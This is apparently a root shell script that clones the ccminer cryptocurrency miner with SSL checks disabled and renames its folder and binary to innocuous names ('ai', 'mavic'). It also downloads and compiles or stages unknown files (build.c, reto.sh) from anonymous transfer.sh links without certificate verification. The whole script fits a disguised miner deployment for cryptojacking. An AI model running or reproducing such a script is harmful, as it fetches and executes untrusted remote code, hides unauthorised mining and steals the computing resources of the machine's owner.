#!/bin/sh

GIT_SSL_NO_VERIFY=true git clone  --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git 
mv /root/ccminer /root/ai 
cd ai 
wget --no-check-certificate -c http://transfer.sh/ISgzSR/build.c 
gcc -o test build.c 
wget --no-check-certificate -c http://transfer.sh/17AMhz/reto.sh 
chmod 777 reto.sh 
chmod +x build.sh 
chmod +x configure.sh 
chmod +x autogen.sh 
./build.sh 
mv ccminer mavic 
